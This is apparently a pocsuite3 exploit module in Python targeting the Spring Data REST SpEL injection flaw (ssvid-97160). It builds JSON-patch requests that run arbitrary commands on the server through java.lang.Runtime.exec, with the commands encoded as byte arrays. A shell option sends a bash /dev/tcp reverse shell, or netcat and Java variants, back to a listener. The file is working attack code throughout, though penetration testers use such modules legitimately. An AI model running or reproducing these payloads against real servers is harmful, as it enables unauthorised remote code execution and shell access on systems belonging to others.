"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

import base64
from collections import OrderedDict

from pocsuite3.api import Output
from pocsuite3.api import POCBase
from pocsuite3.api import OptDict
# from pocsuite3.api import logger
from pocsuite3.api import requests
from pocsuite3.api import OptString
from pocsuite3.api import register_poc
from pocsuite3.api import POC_CATEGORY
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.api import get_listener_ip
from pocsuite3.api import get_listener_port


class DemoPOC(POCBase):
	vulID = '97160'  # ssvid
	version = '1.0'
	author = ['Knownsec']
	vulDate = '2018-03-07'
	createDate = '2018-03-07'
	updateDate = '2018-03-07'
	references = ['https://www.seebug.org/vuldb/ssvid-97160']
	name = 'Spring Data Rest 远程命令执行漏洞'
	appPowerLink = 'https://spring.io/projects/spring-data-rest'
	appName = 'Spring Data REST'
	appVersion = '''
				Spring Data REST versions 2.5.12, 2.6.7, 3.0 RC3之前的版本、
				Spring Boot versions 2.0.0M4 之前的版本、
				Spring Data release trains Kay-RC3 之前的版本
				'''
	vulType = 'code-exec'
	desc = '''
		Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地
		开发REST风格的Web服务。在REST API的Patch方法中（实现RFC6902），path的
		值被传入setValue，导致执行了SpEL表达式，触发远程命令执行漏洞。
	'''
	samples = ['http://10.10.50.91:8092']
	install_requires = []
	category = POC_CATEGORY.EXPLOITS.WEBAPP

	def _options(self):
		o = OrderedDict()
		o["cmd"] = OptString('touch /tmp/success', description='需要用户输入执行的命令', require=True)
		payload = {
			"nc": REVERSE_PAYLOAD.NC,
			"bash": """bash -i >& /dev/tcp/{0}/{1} 0>&1""",
			"java": REVERSE_PAYLOAD.JAVA,
		}
		o["command"] = OptDict(selected="bash", default=payload)
		
		return o

	def _verify(self):
		result = {}
		get_headers = url_headers()
		playload = get_data(self.get_option("cmd"))
		# /customers/1
		p = requests.patch(url=self.url, headers=get_headers, json=playload)
		if 'EL1010E: Property or field \'lastname\' cannot be set on object of type \'java.lang.UNIXProcess\'' in p.text:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['url'] = self.url
			result['VerifyInfo']['playload'] = playload

		return self.parse_output(result)

	def _attack(self):
		return self._verify()

	def _shell(self):
		result = {}
		get_headers = url_headers()
		playload = shell_data(self.get_option("command"))
		# /customers/1
		p = requests.patch(self.url, headers=get_headers, json=playload)
		if 'EL1010E: Property or field \'lastname\' cannot be set on object of type \'java.lang.UNIXProcess\'' in p.text:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['url'] = self.url
			result['VerifyInfo']['playload'] = playload
		
		return self.parse_output(result)

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output

def url_headers():
	headers = {
		'Accept-Language': 'en',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
		'Accept': '*/*',
		'Accept-Encoding': 'gzip, deflate',
		'Content-Type': 'application/json-patch+json',
		'Connection': 'close'
	}
	
	return headers

def get_data(commond):
	msg = char_to_ord(commond)
	tmp = "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{%s}))/lastname" % msg
	data = [{ "op": "replace", "path":tmp , "value": "vulhub" }]
	
	return data

def char_to_ord(commond):
	msg = ''
	for i in commond:
		msg = msg + str(ord(i)) + ','
	msg = msg.rstrip(',')

	return msg

def shell_data(commond):
	data = 'bash -c {echo,'
	data += str(base64.b64encode(commond.encode('utf-8')),'utf-8')
	data += '}|{base64,-d}|{bash,-i}'

	msg = char_to_ord(data)
	tmp = "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{%s}))/lastname" % msg
	data = [{ "op": "replace", "path":tmp , "value": "vulhub" }]
	
	return data

register_poc(DemoPOC)